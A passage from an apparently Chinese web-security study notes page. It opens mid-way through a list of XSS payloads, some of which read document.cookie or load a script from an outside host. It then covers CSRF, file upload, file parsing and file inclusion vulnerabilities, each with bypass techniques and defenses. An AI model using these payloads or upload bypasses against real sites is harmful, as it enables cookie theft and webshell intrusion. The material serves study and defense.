SRC&#x3D;”javascript:alert(14);”&gt;&lt;&#x2F;IFRAME&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;”refresh” content&#x3D;”0;</span><br><span class="line">url&#x3D;data:text&#x2F;html,&lt;script&gt;alert(15)&lt;&#x2F;script&gt;”&gt;</span><br><span class="line">&lt;object data&#x3D;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;&gt;&lt;&#x2F;object&gt;　　　　＃此为base64编码，有兴趣可以试试其他编码方式</span><br><span class="line">&lt;input onfocus&#x3D;alert(16) autofocus&gt;　　　　＃使用这行攻击代码会无限弹xss</span><br><span class="line">&lt;input onblur&#x3D;alert(17) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;sCrIpt&gt;alErt(‘xss’)&lt;&#x2F;ScRiPT&gt;</span><br><span class="line">&lt;script&gt;alert(“xss”);&lt;&#x2F;script&gt;</span><br><span class="line">3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</span><br><span class="line">&lt;a href&#x3D; &gt;link&lt;&#x2F;a &gt;</span><br><span class="line">&lt;a href&#x3D;”javascript:alert(‘xss’)”&gt;link&lt;&#x2F;a &gt;</span><br><span class="line">&lt;script&gt;alert(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt; img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;script&gt;confirm(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;data:text&#x2F;javascript,alert(8888)&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&amp;#100&amp;#97&amp;#116&amp;#97:text&#x2F;javascript,alert(8888)&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(String.fromCharCode(49,49))&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(&#x2F;8888&#x2F;.source)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;setTimeout(alert(8888),0)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;anytag onmouseover&#x3D;alert(1)&gt;h</span><br><span class="line">&lt;anytag onclick&#x3D;alert(2)&gt;h</span><br><span class="line">&lt;a onmouseover&#x3D;alert(3)&gt;h</span><br><span class="line">&lt;a onclick&#x3D;alert(4)&gt;h</span><br><span class="line">&lt;a href&#x3D;javascript:alert(5)&gt;h</span><br><span class="line">&lt;button&#x2F;onclick&#x3D;alert(6)&gt;h</span><br><span class="line">formaction&#x3D;javascript&amp;colon;alert(7)&gt;h</span><br><span class="line">&lt;form&#x2F;action&#x3D;javascript:alert(8)&gt;&lt;input&#x2F;type&#x3D;submit&gt;</span><br><span class="line">&lt;form onsubmit&#x3D;alert(9)&gt;&lt;button&gt;h</span><br><span class="line">&lt;form onsubmit&#x3D;alert(10)&gt;&lt;button&gt;h</span><br><span class="line">&lt; img src&#x3D;x onerror&#x3D;alert(11)&gt;29</span><br><span class="line">&lt;body&#x2F;onload&#x3D;alert(12)&gt;</span><br><span class="line">&lt;body onscroll&#x3D;alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;iframe&#x2F;onload&#x3D;alert(document.domain)&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;IFRAME SRC&#x3D;”javascript:alert(14);”&gt;&lt;&#x2F;IFRAME&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;”refresh” content&#x3D;”0;</span><br><span class="line">url&#x3D;data:text&#x2F;html,&lt;script&gt;alert(15)&lt;&#x2F;script&gt;”&gt;</span><br><span class="line">&lt;object data&#x3D;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;&gt;&lt;&#x2F;object&gt;</span><br><span class="line">&lt;input onfocus&#x3D;alert(16) autofocus&gt;</span><br><span class="line">&lt;input onblur&#x3D;alert(17) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">&lt;SCRIPT SRC&#x3D;http:&#x2F;&#x2F;xss.rocks&#x2F;xss.js&gt;&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(&#39;XSS&#39;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;JaVaScRiPt:alert(&#39;XSS&#39;)&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)&gt;</span><br><span class="line">&lt;a onmouseover&#x3D;&quot;alert(document.cookie)&quot;&gt;xxs link&lt;&#x2F;a &gt;</span><br><span class="line">&lt;a onmouseover&#x3D;alert(document.cookie)&gt;xxs link&lt;&#x2F;a &gt;</span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&quot;&gt;</span><br><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&lt;IMG onmouseover&#x3D;&quot;alert(&#39;xxs&#39;)&quot;&gt;</span><br><span class="line">&lt; img src&#x3D;x onerror&#x3D;&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0</span><br></pre></td></tr></table></figure>







<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CSRF是跨站请求伪造攻击，由客户端发起，攻击者通过伪造一个网站，在用户点击之后，不知情的情况下，以当前用户的身份发送业务伪造</span><br><span class="line"></span><br><span class="line">黑客通过伪造特殊的请求，然后欺骗目标用户进行点击，一旦目标点击了这个请求，就完成了攻击</span><br><span class="line"></span><br><span class="line">通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/2020121817124927.png" alt="img"></p>
<h3 id="利用场景-1"><a href="#利用场景-1" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">涉及到数据的增、删、改的地方都可能存在csrf漏洞</span><br></pre></td></tr></table></figure>



<h3 id="漏洞危害-3"><a href="#漏洞危害-3" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改受害者网站上的用户名和密码</span><br><span class="line">账户劫持</span><br><span class="line">传播csrf蠕虫</span><br><span class="line">利用其他漏洞进行组合攻击</span><br></pre></td></tr></table></figure>



<h3 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">主要判断有没有csrf_token</span><br><span class="line"></span><br><span class="line">1、GET类型的CSRF的检测</span><br><span class="line"></span><br><span class="line">    如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在CSRF漏洞。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、POST类型的CSRF的检测</span><br><span class="line"></span><br><span class="line">    如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，再去掉referer参数的内容，如果仍然可以，说明存在CSRF漏洞，可以利用构造外部form表单的形式，实现攻击。如果直接去掉referer参数请求失败，这种还可以继续验证对referer的判断是否严格，是否可以绕过。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、特殊情况的POST类型的CSRF检测</span><br><span class="line"></span><br><span class="line">    如果上述post方式对referer验证的特别严格，有的时候由于程序员对请求类型判断不是很严格，可以导致post请求改写为get请求，从而CSRF。直接以get请求的方式进行访问，如果请求成功，即可以此种方式绕过对referer的检测，从而CSRF。</span><br></pre></td></tr></table></figure>



<h3 id="防御方案-3"><a href="#防御方案-3" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.不要用get请求传递数据，用post可以降低风险</span><br><span class="line">2.加入验证码（图形、手机），要注意避免流程绕过</span><br><span class="line">3.校验referer</span><br><span class="line"></span><br><span class="line">************************ （最有效的方法） *********************</span><br><span class="line">4.增加csrf_token</span><br><span class="line">	Anti CSRF Token：缓解服务器压力，**前提是不存在xss漏洞**，也就是我们读取到cookie里的值，该方法主要是将csrf_token的值和cookie中csrf_token是否一致，也就是说，攻击者不知道cookie里的值，只能修改data里的csrf_token，这样两个地方的csrf_token的值是不一致的，所有能够防御csrf</span><br><span class="line">	</span><br><span class="line">	为了减少服务端压力，使用客户端csrf_token校验，检查cookie内的csrf_token与data内的csrf_token是否一致。由于黑客在只使用csrf攻击时，是没有目标的cookie（httponly限制了对cookie的访问），所以伪造的data内的csrf_token是无法通过校验的，所以这样可以防御csrf</span><br></pre></td></tr></table></figure>



<h3 id="绕过手段-3"><a href="#绕过手段-3" class="headerlink" title="绕过手段"></a>绕过手段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.csrf_token重放</span><br><span class="line">2.置空</span><br><span class="line">3.特殊值（Null、None，还有一些注释符之类的）</span><br><span class="line">4.解密：破解随机数的算法，几乎无法实现</span><br><span class="line">5.溢出</span><br><span class="line">6.绕过referer：</span><br><span class="line">	配合xss</span><br><span class="line">	请求后面加上想要伪造的referer，例如：http:&#x2F;&#x2F;target.com&#x2F;index.html?127.0.0.1，这样可以干扰检测</span><br></pre></td></tr></table></figure>



<h3 id="实战场景"><a href="#实战场景" class="headerlink" title="实战场景"></a>实战场景</h3><h3 id="扩展知识"><a href="#扩展知识" class="headerlink" title="扩展知识"></a>扩展知识</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><ul>
<li><strong>协议、域名、端口相同才算同源</strong></li>
<li>浏览器判断一个网站是否能操作另一个网站的cookie的依据是域名</li>
</ul>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><ul>
<li><p>存储在客户端</p>
</li>
<li><p>分为会话cookie、持久型cookie</p>
</li>
<li><p>各个属性：</p>
<ul>
<li><table>
<thead>
<tr>
<th align="center">name</th>
<th align="center">必需，指定cookie的名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>value</strong></td>
<td align="center"><strong>必需，规定cookie的值</strong></td>
</tr>
<tr>
<td align="center"><strong>expire</strong></td>
<td align="center"><strong>可选，指定cookie的有效期</strong></td>
</tr>
<tr>
<td align="center"><strong>path</strong></td>
<td align="center"><strong>可选，指定cookie的路径</strong></td>
</tr>
<tr>
<td align="center"><strong>domain</strong></td>
<td align="center"><strong>可选，指定cookie的域名</strong></td>
</tr>
<tr>
<td align="center"><strong>secure</strong></td>
<td align="center"><strong>可选，指定是否通过安全的HTTPS来传输cookie</strong></td>
</tr>
<tr>
<td align="center"><strong>HttpOnly</strong></td>
<td align="center"><strong>可选，规定 js 脚本无法读取cookie</strong></td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><ul>
<li>存储在服务器端</li>
<li>session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。</li>
</ul>
<h4 id="cookie-和-session-的区别与联系"><a href="#cookie-和-session-的区别与联系" class="headerlink" title="cookie 和 session 的区别与联系"></a>cookie 和 session 的区别与联系</h4><ul>
<li>cookie存在客户端、session存在服务器</li>
<li>cookie是一种实现标准、session是一种抽象概念</li>
<li>cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗，考虑到<strong>安全</strong>应当使用session</li>
<li>session会在一定时间内保存在服务器上，当访问量增加时，会比较占用服务器的性能，考虑到<strong>减轻服务器</strong>性能方面，应当使用cookie</li>
<li>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie</li>
<li>将登录信息等重要信息存放在<strong>session</strong>，其他信息如果需要保留，可以放在<strong>cookie</strong>中</li>
<li><strong>一般的实现方法</strong>：<ul>
<li>session 信息存储在服务端。这种实现机制中，服务端负责生成和管理 session 信息，每个 session 会有一个 session id，server 返回 response 给 client 时会让后者以 cookie 的形式存储 session id，后续发起 request 请求时，都会在 HTTP 报文的 Cookie 首部中携带 session id，server 根据 id 找到对应的 session 信息。</li>
<li>cookie 信息存储在客户端。这种实现机制中，服务端负责生成 session 信息，但不存储，在 response 中，通过 Set-Cookie 首部让 client 把 session 信息（一般都进行了加密）存在 cookie 中，后续 client 发起 request 请求时，server 从 Cookie 首部取出 session 信息进行解密读取，以及进行各种操作，然后再通过 Set-Cookie 回写到 client。</li>
</ul>
</li>
</ul>
<h3 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">********************* cookie、session各自的概念与区别联系 *********************</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;b5efddc433f5#_caption_22</span><br></pre></td></tr></table></figure>





<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于文件上传、文件解析、和文件包含漏洞，如果是只存在其中的一个漏洞，是会比较难以利用的，一般而言，如果存在其中的两种漏洞，就意味着可以配合使用了</span><br></pre></td></tr></table></figure>



<h3 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、修改头像、分享图片&#x2F;视频等</span><br><span class="line">2. 正常的文件一般是文档、图片、视频等，Web应用收集之后放入后台存储，需要的时候再调用出来返回</span><br><span class="line">3. 如果恶意文件如PHP、ASP等可执行文件绕过Web应用安全机制并顺利执行，则相当于黑客直接拿到了Webshell</span><br><span class="line">4. 一旦黑客拿到Webshell，则可以拿到Web应用的数据，删除Web文件，甚至本地提权，进一步拿下整个服务器甚至内网渗透</span><br><span class="line">5. SQL注入攻击的对象是数据库服务，文件上传漏洞主要攻击Web服务，实际渗透过程一般结合起来，达到对目标服务的深度控制</span><br><span class="line"></span><br><span class="line">用户能够上传webshell，服务器没有对文件进行合法性校验，并且能够得知文件存储位置，同时上传的webshell能被正确地执行。</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/5b60b13eb92d445f8f84c830b2c7052f.png"></p>
<h3 id="利用场景-2"><a href="#利用场景-2" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   注册&#x2F;修改个人信息处（上传头像）</span><br><span class="line">   敏感身份认证处（身份证照片&#x2F;银行卡照片&#x2F;个人照片……）【多为金融&#x2F;借贷应用】</span><br><span class="line">   订单评价反馈处（上传商品照片）【淘宝&#x2F;京东……】</span><br><span class="line">   朋友圈&#x2F;空间</span><br><span class="line">   所有能上传操作的地方……	</span><br><span class="line"></span><br><span class="line">关注点：</span><br><span class="line">	1.文件的存储路径</span><br><span class="line">	2.文件大小（是否要ddos塞满硬盘）和内容（有无意义的webshell）</span><br><span class="line"></span><br><span class="line">关键点：</span><br><span class="line">	1.恶意文件可以成功上传</span><br><span class="line">	2.恶意文件上传之后的路径可以被获取</span><br><span class="line">	3.恶意文件可被访问或执行</span><br><span class="line">	</span><br><span class="line">造成的原因：</span><br><span class="line">   	1.文件解析器或者处理模块存在漏洞：https:&#x2F;&#x2F;imagetragick.com&#x2F;比较常见的</span><br><span class="line">   	2.服务器配置不当（本地文件上传限制被绕过、文件解析漏洞导致文件被执行）</span><br><span class="line">	3.覆盖系统上的现有文件（要注意避免覆盖配置）</span><br></pre></td></tr></table></figure>



<h3 id="漏洞危害-4"><a href="#漏洞危害-4" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.攻击服务器：可以通过上传和执行webshell来运行命令、浏览系统文件、甚至是接管服务器。</span><br><span class="line"></span><br><span class="line">2.攻击客户端：上传恶意文件还可能使得网站容易受到客户端攻击，例如xss或者劫持等。</span><br><span class="line"></span><br><span class="line">3.上传的文件可能会触发实时监控工具中的漏洞。</span><br><span class="line"></span><br><span class="line">4.上传功能可能被恶意利用，比如被用来托管恶意软件、非法软件或成人内容。上传的文件还可能包含使用隐写术隐藏的数据。</span><br><span class="line"></span><br><span class="line">5.上传功能可能触发程序报错、泄露敏感信息（暴露内部信息，比如服务器内部路径）。</span><br><span class="line">		</span><br></pre></td></tr></table></figure>



<h3 id="测试方法-2"><a href="#测试方法-2" class="headerlink" title="测试方法"></a>测试方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">************** 通用检测方法：**************</span><br><span class="line">		1.上传不允许上传的文件</span><br><span class="line">		2.绕过验证或者限制措施（00截断，百分号%等，0x00会被当作0，以为是结束符）</span><br><span class="line">			检查网站是否仅通过http请求中的content-type检查文件类型</span><br><span class="line">			检查网站是否仅通过文件拓展名进行检查</span><br><span class="line">		3.检查是否可以找到上传的文件的访问路径，并检查是否可以直接访问或执行</span><br><span class="line">		4.检查上传的文件是否包含恶意代码</span><br><span class="line">		</span><br><span class="line">        - 上传不允许上传的文件（如php、exe或包含脚本的html文件）</span><br><span class="line">        - 绕过验证或者限制措施</span><br><span class="line">        - 检查网站是否仅在客户端js验证了文件类型</span><br><span class="line">        - 检查网站是否仅通过http请求中的“content-type”检查文件类型</span><br><span class="line">        - 检查网站是否仅通过文件扩展名进行检查</span><br><span class="line">        - 检查是否可以找到上传的文件的访问路径，并检查是否可以直接访问或执行</span><br><span class="line">        - 检查上传的文件是否包含恶意代码</span><br><span class="line"></span><br><span class="line">************** 对应用平台的攻击 **************</span><br><span class="line">			上传图片文件进行图片库的漏洞利用（例如：图片操作的库）</span><br><span class="line">			上传大文件执行文件空间拒绝服务攻击（消耗磁盘资源）</span><br><span class="line">			上传包含”标签“的文件，标签可能被当作网页的一部分被执行</span><br><span class="line">************** 对其他系统的攻击 ************** </span><br><span class="line">			将.exe文件上传到web应用中，受害者可能会下载可执行木马文件</span><br><span class="line">			上传病毒感染机器</span><br><span class="line">			上传有防病毒软件扫描的.rar文件，攻击杀毒软件（杀毒软件可能也会存在漏洞）</span><br></pre></td></tr></table></figure>



<h3 id="防御方案-4"><a href="#防御方案-4" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.限制上传文件的权限，不可执行。文件上传就不能实现，但是文件包含可能还行</span><br><span class="line">2.文件名随机化</span><br><span class="line">3.高阶防御方法：</span><br><span class="line">	将文件内容进行解析，看是否可能包含攻击代码</span><br><span class="line">	将上传的文件放入沙箱运行，检测文件行为，看是否存在异常操作</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/a769fac7de3b4001a70c3954e7bd8ca7.png"></p>
<h3 id="绕过手段-4"><a href="#绕过手段-4" class="headerlink" title="绕过手段"></a>绕过手段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">根据上图来绕过：</span><br><span class="line">***************** 1.客户端校验：*****************</span><br><span class="line">		burp抓包绕过</span><br><span class="line">		</span><br><span class="line">***************** 2.对MIME类型检测：*****************</span><br><span class="line">		burp修改content-type</span><br><span class="line">		</span><br><span class="line">***************** 3.对后缀名进行检测：*****************</span><br><span class="line">		利用burp修改后缀名</span><br><span class="line">		常用方法有：</span><br><span class="line">			文件名大小写绕过，例如Php，AsP等类似的文件名</span><br><span class="line">            后缀名字双写嵌套，例如pphphp，asaspp等</span><br><span class="line">            可以利用系统会对一些特殊文件名做默认修改的系统特性绕过</span><br><span class="line">            可以利用asp程序中的漏洞，使用截断字符绕过</span><br><span class="line">            可以利用不再黑名单列表中却能够成功执行的同义后缀名绕过黑名单的限制</span><br><span class="line">            可以利用解析&#x2F;包含漏洞配合上传一个代码注入过的白名单文件绕过</span><br><span class="line">            </span><br><span class="line">***************** 4.对目录路径的防御 *****************</span><br><span class="line">		目录扫描</span><br><span class="line">        信息收集找到网站框架常用的路径</span><br><span class="line">        </span><br><span class="line">***************** 5.对文件内容进行检测 *****************</span><br><span class="line">		通过在文件中添加正常文件的标识或其他关键字符绕过</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/20190830165550583.png" alt="在这里插入图片描述"></p>
<h3 id="实战案例-3"><a href="#实战案例-3" class="headerlink" title="实战案例"></a>实战案例</h3><h3 id="参考资料-4"><a href="#参考资料-4" class="headerlink" title="参考资料"></a>参考资料</h3><h2 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><h3 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web容器在解析文件时，由于配置不当（不安全配置），导致出现了漏洞。上传的文件被当作其他格式的文件执行。</span><br><span class="line"></span><br><span class="line">文件上传漏洞通常与Web容器的解析漏洞配合利用</span><br><span class="line">常见Web容器有IIS、Nginx、Apache、Tomcat等</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="利用场景-3"><a href="#利用场景-3" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="漏洞危害-5"><a href="#漏洞危害-5" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搭配文件上传利用，从而可以上传webshell</span><br></pre></td></tr></table></figure>

<h3 id="测试方法-3"><a href="#测试方法-3" class="headerlink" title="测试方法"></a>测试方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先判断web容器类型，看对应版本是否存在解析漏洞</span><br><span class="line">nginx</span><br><span class="line">apache</span><br><span class="line">iis</span><br></pre></td></tr></table></figure>

<p><img src="https://yim-markdown.oss-cn-guangzhou.aliyuncs.com/images/20200819151249632.png" alt="在这里插入图片描述"></p>
<h3 id="防御方案-5"><a href="#防御方案-5" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">更新web容器</span><br><span class="line">修改不安全的配置</span><br></pre></td></tr></table></figure>

<h3 id="绕过手段-5"><a href="#绕过手段-5" class="headerlink" title="绕过手段"></a>绕过手段</h3><p>文件解析漏洞有就是有，没有就是没有</p>
<h3 id="实战案例-4"><a href="#实战案例-4" class="headerlink" title="实战案例"></a>实战案例</h3><h3 id="参考资料-5"><a href="#参考资料-5" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vulhub.org&#x2F;</span><br></pre></td></tr></table></figure>





<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="漏洞原理-6"><a href="#漏洞原理-6" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">什么是文件包含？</span><br><span class="line">为了更好地使代码有可重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，即可直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件的代码。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">漏洞产生的原因：文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件包含可以包含任意文件，如图片，文本文件，压缩包等等，如果文件中有服务器能识别的脚本语言，就按照当前脚本语言执行，否则就直接显示出源代码。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="利用场景-4"><a href="#利用场景-4" class="headerlink" title="利用场景"></a>利用场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*********************** 文件包含常见函数 ***********************</span><br><span class="line">PHP：include() 、include_once( )、require( )、require_once( )、fopen( )、readfile( )</span><br><span class="line">JSP&#x2F;Servlet：ava.io.file( )、java.io.filereader( )</span><br><span class="line">ASP：include file、include virtual</span><br><span class="line"></span><br><span class="line">        include()和require()的区别：</span><br><span class="line">        require()如果在包含过程中出错，就会直接退出，不执行后续语句。</span><br><span class="line">        